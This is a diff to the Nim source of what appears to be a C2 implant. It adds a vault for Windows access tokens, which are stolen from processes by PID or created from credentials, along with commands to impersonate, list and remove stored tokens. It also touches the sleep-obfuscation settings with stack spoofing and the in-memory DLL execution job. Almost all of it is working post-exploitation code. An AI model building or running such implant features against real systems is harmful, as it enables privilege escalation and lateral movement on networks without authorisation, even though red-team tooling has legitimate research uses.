@@ -84,7 +84,11 @@ commands[CMD_SLEEPMASK] = proc(ctx: AgentCtx, task: Task): TaskResult =
             ctx.sleepSettings.sleepTechnique = parseEnum[SleepObfuscationTechnique](Bytes.toString(task.args[0].data).toUpperAscii())
             ctx.sleepSettings.spoofStack = spoofStack
 
-        let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}s, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
+        let response = fmt"""Sleep settings: 
+ - Technique:      {$ctx.sleepSettings.sleepTechnique}
+ - Delay:          {$ctx.sleepSettings.sleepDelay}s
+ - Jitter:         {$ctx.sleepSettings.jitter}%
+ - Stack spoofing: {$ctx.sleepSettings.spoofStack}"""
         return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
 
     except CatchableError as err: 
@@ -255,10 +259,10 @@ when ((MODULES and cast[uint32](MODULE_DLL)) == cast[uint32](MODULE_DLL)):
     proc dllJob(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
         var unpacker = Unpacker.init(Bytes.toString(task.args[0].data))
         let
-            dllName:    string    = unpacker.getDataWithLengthPrefix()
-            dllBytes:   seq[byte] = string.toBytes(unpacker.getDataWithLengthPrefix())
-            exportName: string    = Bytes.toString(task.args[1].data)
-            args:       seq[byte] = Bytes.fromHex(task.args[2].data)
+            dllName: string = unpacker.getDataWithLengthPrefix()
+            dllBytes: seq[byte] = string.toBytes(unpacker.getDataWithLengthPrefix())
+            exportName: string = Bytes.toString(task.args[1].data)
+            args: seq[byte] = Bytes.fromHex(task.args[2].data)
         
         print fmt"   [>] Executing DLL {dllName} as a new job."
         execDll(dllBytes, exportName, args, hWrite, ctx.hWakeupEvent, hStopEvent)
@@ -401,33 +405,89 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
                 username = Bytes.toString(task.args[0].data)
                 password = Bytes.toString(task.args[1].data)
                 logonType: DWORD = cast[DWORD](Bytes.toUint32(task.args[2].data))
+                store = cast[bool](task.args[3].data[0])
         
             # Split username and domain at separator '\'
             let userParts = username.split("\\", 1)
             if userParts.len() != 2: 
                 raise newException(CatchableError, protect("Expected format domain\\username."))
             
-            var impersonationUser = makeToken(userParts[1], password, userParts[0], logonType)
+            let hToken = makeToken(userParts[1], password, userParts[0], logonType)
+            var tokenUsername = getTokenUser(hToken).username
             if logonType != LOGON32_LOGON_NEW_CREDENTIALS:
-                impersonationUser = impersonationUser
+                tokenUsername = username
             else:
-                impersonationUser = username
+                tokenUsername = username
                 
-            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {impersonationUser}."))
+            if store:
+                ctx.tokenVault.add(hToken)
+            else:
+                CloseHandle(hToken)
+
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {tokenUsername}."))
+
+        except CatchableError as err:
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
+    commands[CMD_STEAL_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult =
+        try:
+            print fmt"   [>] Stealing access token."
+
+            let
+                pid = int(Bytes.toUint32(task.args[0].data))
+                store = cast[bool](task.args[1].data[0])
+
+            let hToken = stealToken(pid)
+            let tokenUsername = getTokenUser(hToken).username
+
+            if store:
+                ctx.tokenVault.add(hToken)
+            else:
+                CloseHandle(hToken)
+
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {tokenUsername}."))
 
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
-
-    commands[CMD_STEAL_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult = 
+    
+    commands[CMD_USE_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
-            print fmt"   [>] Stealing access token."
+            print fmt"   [>] Impersonating token from vault."
 
-            let pid = int(Bytes.toUint32(task.args[0].data))       
-            let username  = stealToken(pid)
+            let tokenId = int(Bytes.toUint32(task.args[0].data))
+            if tokenId < 1 or tokenId > ctx.tokenVault.len():
+                return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(fmt"Invalid token ID: {tokenId}"))
+            
+            let hToken = ctx.tokenVault[tokenId - 1]
+            let username = getTokenUser(hToken).username
+            impersonate(hToken)
 
             return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))
 
         except CatchableError as err: 
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
+    commands[CMD_REMOVE_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult =
+        try:
+            print fmt"   [>] Removing token from vault."
+
+            # Clear token vault
+            if cast[bool](task.args[1].data[0]):
+                for hToken in ctx.tokenVault:
+                    CloseHandle(hToken)
+                ctx.tokenVault.setLen(0)
+                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes("Removed all tokens from vault."))
+            
+            let tokenId = int(Bytes.toUint32(task.args[0].data))
+            if tokenId < 1 or tokenId > ctx.tokenVault.len():
+                return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(fmt"Invalid token ID: {tokenId}"))
+
+            CloseHandle(ctx.tokenVault[tokenId - 1])
+            ctx.tokenVault.del(tokenId - 1)
+
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Removed token {tokenId} from vault."))
+
+        except CatchableError as err:
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_REV2SELF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
@@ -439,6 +499,24 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
         except CatchableError as err: 
             return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
         
+    commands[CMD_TOKEN_VAULT] = proc(ctx: AgentCtx, task: Task): TaskResult =
+        try:
+            print fmt"   [>] Listing token vault."
+            if ctx.tokenVault.len == 0:
+                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes("Token vault is empty."))
+            
+            var output = "ID".alignLeft(4) & "Handle".alignLeft(10) & "Username" & "\n"
+            output &= "--".alignLeft(4) & "------".alignLeft(10) & "--------" & "\n"
+            
+            for i, hToken in ctx.tokenVault:
+                let handle = "0x" & toHex(cast[uint64](hToken), 6)
+                output &= ($(i + 1)).alignLeft(4) & handle.alignLeft(10) & getTokenUser(hToken).username & "\n"
+            
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
+        
+        except CatchableError as err:
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
     commands[CMD_TOKEN_INFO] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             print fmt"   [>] Retrieving token information."
